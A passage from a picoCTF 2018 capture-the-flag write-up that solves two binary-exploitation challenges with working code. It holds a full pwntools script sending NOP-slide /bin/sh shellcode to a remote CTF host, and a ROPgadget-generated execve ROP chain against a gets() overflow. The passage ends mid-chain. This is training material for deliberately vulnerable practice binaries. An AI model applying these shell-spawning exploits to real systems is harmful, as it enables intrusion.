</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#ff79c6>#define GPS_ACCURACY 1337
</span><span style=color:#ff79c6></span>
<span style=color:#8be9fd>void</span> <span style=color:#ff79c6>*</span><span style=color:#50fa7b>query_position</span>() {
  <span style=color:#8be9fd>char</span> stk;
  <span style=color:#8be9fd>int</span> offset <span style=color:#ff79c6>=</span> rand() <span style=color:#ff79c6>%</span> GPS_ACCURACY <span style=color:#ff79c6>-</span> (GPS_ACCURACY <span style=color:#ff79c6>/</span> <span style=color:#bd93f9>2</span>);
  <span style=color:#8be9fd>void</span> <span style=color:#ff79c6>*</span>ret <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>&amp;</span>stk <span style=color:#ff79c6>+</span> offset;
  <span style=color:#ff79c6>return</span> ret;
}
[...]
<span style=color:#8be9fd>char</span> buffer[<span style=color:#bd93f9>0x1000</span>];
[...]
printf(<span style=color:#f1fa8c>&#34;We need to access flag.txt.</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>Current position: %p</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>, query_position());
</code></pre></td></tr></table>
</div>
</div><p>Being provided the approximative address of <code>stk</code>, we should be able to make a good guess of an address within the buffer.</p>
<p>As we know the stack is executable and we can control the buffer[0x1000], we can craft a nop slide followed by a shellcode that fits in our buffer.</p>
<p>In python, it can be done with pwntools:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>BUFFER_SIZE <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x1000</span>
shellcode <span style=color:#ff79c6>=</span> pwnlib<span style=color:#ff79c6>.</span>shellcraft<span style=color:#ff79c6>.</span>amd64<span style=color:#ff79c6>.</span>linux<span style=color:#ff79c6>.</span>sh()
sc_asm <span style=color:#ff79c6>=</span> asm(shellcode)
nop <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x90</span><span style=color:#f1fa8c>&#39;</span>
payload <span style=color:#ff79c6>=</span> nop <span style=color:#ff79c6>*</span> (BUFFER_SIZE<span style=color:#ff79c6>-</span><span style=color:#8be9fd;font-style:italic>len</span>(sc_asm)<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>+</span> sc_asm
</code></pre></td></tr></table>
</div>
</div><p>Then the program prompts us for our plan; our input will be the payload:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>    printf(<span style=color:#f1fa8c>&#34;What&#39;s your plan?</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&gt; &#34;</span>);
    fgets(buffer, <span style=color:#ff79c6>sizeof</span>(buffer), stdin);
</code></pre></td></tr></table>
</div>
</div><p>The final input is our guess of an approximative address inside the buffer location. This address <code>location</code>will be indeed written and executed.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>    printf(<span style=color:#f1fa8c>&#34;Where do we start?</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&gt; &#34;</span>);
    scanf(<span style=color:#f1fa8c>&#34;%p&#34;</span>, (<span style=color:#8be9fd>void</span><span style=color:#ff79c6>**</span>) <span style=color:#ff79c6>&amp;</span>location);

    location();
</code></pre></td></tr></table>
</div>
</div><p>Full exploit:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>

<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>
<span style=color:#ff79c6>import</span> re

DEV <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>

context(arch<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;amd64&#39;</span>, os<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;linux&#39;</span>, bits <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;64&#39;</span>)
h, p <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>, <span style=color:#bd93f9>49351</span>

<span style=color:#6272a4>#print shellcraft.nop()</span>
<span style=color:#6272a4>#print &#39;######################&#39;</span>
<span style=color:#6272a4>#nop = asm(shellcraft.nop())</span>
<span style=color:#6272a4>#print nop</span>
<span style=color:#6272a4>#print &#39;######################&#39;</span>

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>payload</span>():
    shellcode <span style=color:#ff79c6>=</span> pwnlib<span style=color:#ff79c6>.</span>shellcraft<span style=color:#ff79c6>.</span>amd64<span style=color:#ff79c6>.</span>linux<span style=color:#ff79c6>.</span>sh()
    sc_asm <span style=color:#ff79c6>=</span> asm(shellcode)
    BUFFER_SIZE <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x1000</span>
    nop <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x90</span><span style=color:#f1fa8c>&#39;</span>
    payload <span style=color:#ff79c6>=</span> nop <span style=color:#ff79c6>*</span> (BUFFER_SIZE<span style=color:#ff79c6>-</span><span style=color:#8be9fd;font-style:italic>len</span>(sc_asm)<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>+</span> sc_asm
    <span style=color:#ff79c6>return</span> payload

<span style=color:#ff79c6>if</span> DEV:
    p <span style=color:#ff79c6>=</span> process(<span style=color:#f1fa8c>&#39;./gps&#39;</span>)
<span style=color:#ff79c6>else</span>:
    p <span style=color:#ff79c6>=</span> remote(h, p)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>guess_approximate_buffer_address</span>():
    prompt <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;&gt; &#39;</span>)
    current_address <span style=color:#ff79c6>=</span> re<span style=color:#ff79c6>.</span>search(<span style=color:#f1fa8c>&#34;Current position: (0x[a-fA-F0-9]+)&#34;</span>, prompt)<span style=color:#ff79c6>.</span>group(<span style=color:#bd93f9>1</span>)
    GPS_ACCURACY <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1337</span>
    guess <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(current_address, <span style=color:#bd93f9>16</span>) <span style=color:#ff79c6>+</span> GPS_ACCURACY
    <span style=color:#ff79c6>return</span> guess

guess <span style=color:#ff79c6>=</span> guess_approximate_buffer_address()
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Destination: 0x</span><span style=color:#f1fa8c>{:02x}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(guess))

p<span style=color:#ff79c6>.</span>sendline(payload())
p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;&gt; &#39;</span>)
p<span style=color:#ff79c6>.</span>sendline(<span style=color:#8be9fd;font-style:italic>format</span>(guess, <span style=color:#f1fa8c>&#39;x&#39;</span>))

p<span style=color:#ff79c6>.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id=can-you-gets-me>can-you-gets-me</h2>
<ul>
<li>source: <a href=./resources/can-you-gets-me/gets.c>gets.c</a></li>
<li>binary: <a href=./resources/can-you-gets-me/gets.c>gets</a></li>
<li>Resource: <a href=https://github.com/JonathanSalwan/ROPgadget>RopGadget</a></li>
</ul>
<p>The code is vulnerable to buffer-overflow but the buffer is small and the stack is not executable</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>vuln</span>() {
  <span style=color:#8be9fd>char</span> buf[<span style=color:#bd93f9>16</span>];
  printf(<span style=color:#f1fa8c>&#34;GIVE ME YOUR NAME!</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);
  <span style=color:#ff79c6>return</span> gets(buf);
}
</code></pre></td></tr></table>
</div>
</div><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>checksec ./gets
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> <span style=color:#f1fa8c>&#39;/home/ctf/kali/picoCTF/binary-exploitation/can-you-gets-me/gets&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled		&lt;-- not executable stack
    PIE:      No PIE <span style=color:#ff79c6>(</span>0x8048000<span style=color:#ff79c6>)</span>
</code></pre></td></tr></table>
</div>
</div><p>Therefore a ROP chain is the right approach. We can use <a href=https://github.com/JonathanSalwan/ROPgadget>RopGadget</a> to streamline the crafting of a payload</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/opt/ROPgadget/ROPgadget.py --binary ./gets --ropchain &gt; rop_output.txt
tail -40 rop_output.txt
	<span style=color:#6272a4># execve generated by ROPgadget</span>

	from struct import pack

	<span style=color:#6272a4># Padding goes here</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>

	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0806f19a<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop edx ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080ea060<span style=color:#ff79c6>)</span> <span style=color:#6272a4># @ .data</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080b84d6<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;/bin&#39;</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x08054b4b<span style=color:#ff79c6>)</span> <span style=color:#6272a4># mov dword ptr [edx], eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0806f19a<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop edx ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080ea064<span style=color:#ff79c6>)</span> <span style=color:#6272a4># @ .data + 4</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080b84d6<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;//sh&#39;</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x08054b4b<span style=color:#ff79c6>)</span> <span style=color:#6272a4># mov dword ptr [edx], eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0806f19a<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop edx ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080ea068<span style=color:#ff79c6>)</span> <span style=color:#6272a4># @ .data + 8</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x08049473<span style=color:#ff79c6>)</span> <span style=color:#6272a4># xor eax, eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x08054b4b<span style=color:#ff79c6>)</span> <span style=color:#6272a4># mov dword ptr [edx], eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080481c9<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop ebx ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080ea060<span style=color:#ff79c6>)</span> <span style=color:#6272a4># @ .data</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080dece1<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop ecx ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080ea068<span style=color:#ff79c6>)</span> <span style=color:#6272a4># @ .data + 8</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0806f19a<span style=color:#ff79c6>)</span> <span style=color:#6272a4># pop edx ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x080ea068<span style=color:#ff79c6>)</span> <span style=color:#6272a4># @ .data + 8</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x08049473<span style=color:#ff79c6>)</span> <span style=color:#6272a4># xor eax, eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
